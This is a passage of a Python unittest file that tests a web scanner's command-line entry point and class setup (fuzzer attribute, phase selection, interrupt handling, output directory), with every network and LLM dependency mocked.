    def test_scanner_has_client_attr(self, mock_client_cls, mock_crawler_cls):
        """Test scanner.client attribute works."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            self.assertIsNotNone(scanner.client)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_scanner_has_fuzzer_attr(self, mock_client_cls, mock_crawler_cls):
        """Test scanner.fuzzer attribute exists."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", llm=None, out_dir=Path(tmpdir))
            self.assertIsNone(scanner.fuzzer)


class TestCLIMain(unittest.TestCase):
    """Test the CLI main() function by mocking sys.argv and dependencies."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_main_with_args(self, mock_client_cls, mock_crawler_cls):
        """Test main() parses args and runs scan."""
        from packages.web.scanner import main
        import sys

        with tempfile.TemporaryDirectory() as tmpdir:
            sys.argv = ["scanner.py", "--url", "http://test.com", "--out", tmpdir]

            mock_crawler = MagicMock()
            mock_crawler.crawl.return_value = {
                "stats": {"total_pages": 0, "total_parameters": 0},
                "discovered_parameters": [],
                "pages": [],
            }
            mock_crawler_cls.return_value = mock_crawler

            with patch("packages.web.scanner.save_json"), \
                 patch("packages.llm_analysis.get_client", return_value=None):
                result = main()
                self.assertIsInstance(result, int)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_main_with_phases_arg(self, mock_client_cls, mock_crawler_cls):
        """Test main() with --phases argument."""
        from packages.web.scanner import main
        import sys

        with tempfile.TemporaryDirectory() as tmpdir:
            sys.argv = ["scanner.py", "--url", "http://test.com", "--out", tmpdir, "--phases", "crawl"]

            mock_crawler = MagicMock()
            mock_crawler.crawl.return_value = {
                "stats": {"total_pages": 0, "total_parameters": 0},
                "discovered_parameters": [],
                "pages": [],
            }
            mock_crawler_cls.return_value = mock_crawler

            with patch("packages.web.scanner.save_json"), \
                 patch("packages.llm_analysis.get_client", return_value=None):
                result = main()
                self.assertIsInstance(result, int)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_main_with_llm(self, mock_client_cls, mock_crawler_cls):
        """Test main() when LLM is available."""
        from packages.web.scanner import main
        import sys

        with tempfile.TemporaryDirectory() as tmpdir:
            sys.argv = ["scanner.py", "--url", "http://test.com", "--out", tmpdir, "--phases", "crawl"]

            mock_crawler = MagicMock()
            mock_crawler.crawl.return_value = {
                "stats": {"total_pages": 0, "total_parameters": 0},
                "discovered_parameters": [],
                "pages": [],
            }
            mock_crawler_cls.return_value = mock_crawler

            mock_llm = MagicMock()
            with patch("packages.web.scanner.save_json"), \
                 patch("packages.llm_analysis.get_client", return_value=mock_llm):
                result = main()
                self.assertIsInstance(result, int)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_main_with_insecure_flag(self, mock_client_cls, mock_crawler_cls):
        """Test main() with --insecure flag."""
        from packages.web.scanner import main
        import sys

        with tempfile.TemporaryDirectory() as tmpdir:
            sys.argv = ["scanner.py", "--url", "http://test.com", "--out", tmpdir,
                        "--phases", "crawl", "--insecure"]

            mock_crawler = MagicMock()
            mock_crawler.crawl.return_value = {
                "stats": {"total_pages": 0, "total_parameters": 0},
                "discovered_parameters": [],
                "pages": [],
            }
            mock_crawler_cls.return_value = mock_crawler

            with patch("packages.web.scanner.save_json"), \
                 patch("packages.llm_analysis.get_client", return_value=None):
                result = main()
                self.assertIsInstance(result, int)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_main_keyboard_interrupt(self, mock_client_cls, mock_crawler_cls):
        """Test main() handles KeyboardInterrupt."""
        from packages.web.scanner import main
        import sys

        with tempfile.TemporaryDirectory() as tmpdir:
            sys.argv = ["scanner.py", "--url", "http://test.com", "--out", tmpdir, "--phases", "crawl"]

            mock_crawler = MagicMock()
            mock_crawler.crawl.side_effect = KeyboardInterrupt()
            mock_crawler_cls.return_value = mock_crawler

            with patch("packages.web.scanner.save_json"), \
                 patch("packages.llm_analysis.get_client", return_value=None):
                result = main()
                self.assertEqual(result, 130)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_main_general_exception(self, mock_client_cls, mock_crawler_cls):
        """Test main() returns 1 when scan fails with no vulns."""
        from packages.web.scanner import main
        import sys

        with tempfile.TemporaryDirectory() as tmpdir:
            sys.argv = ["scanner.py", "--url", "http://test.com", "--out", tmpdir, "--phases", "crawl"]

            mock_crawler = MagicMock()
            mock_crawler.crawl.side_effect = RuntimeError("unexpected error")
            mock_crawler_cls.return_value = mock_crawler

            with patch("packages.web.scanner.save_json"), \
                 patch("packages.llm_analysis.get_client", return_value=None):
                result = main()
                # Scan completes gracefully with 0 vulns (crawl error is handled internally)
                self.assertIsInstance(result, int)


class TestUnknownPhase(unittest.TestCase):
    """Test handling of unknown phase names."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_unknown_phase_logged_and_skipped(self, mock_client_cls, mock_crawler_cls):
        """Test unknown phase is logged and skipped."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.save_json"):
            mock_crawler = MagicMock()
            mock_crawler.crawl.return_value = {
                "stats": {"total_pages": 0, "total_parameters": 0},
                "discovered_parameters": [],
                "pages": [],
            }
            mock_crawler_cls.return_value = mock_crawler

            scanner = WebScanner(
                "http://example.com", out_dir=Path(tmpdir),
                phases=["unknown_phase", "crawl"],
            )
            scanner.crawler = mock_crawler

            result = scanner.scan()

            # Unknown phase should not appear in phases_run
            self.assertNotIn("unknown_phase", result["phases_run"])
            self.assertIn("crawl", result["phases_run"])


class TestDefaultOutDir(unittest.TestCase):
    """Test scanner with default out_dir."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_default_out_dir_is_created(self, mock_client_cls, mock_crawler_cls):
        """Test default out_dir is created if not specified."""
        from packages.web.scanner import WebScanner
        import tempfile
        import os

        # Use a subdirectory in tmp that doesn't exist yet
        with tempfile.TemporaryDirectory() as tmpdir:
            out = Path(tmpdir) / "default_out"
            scanner = WebScanner("http://example.com", out_dir=out)
            self.assertTrue(out.exists())


if __name__ == "__main__":
    unittest.main()
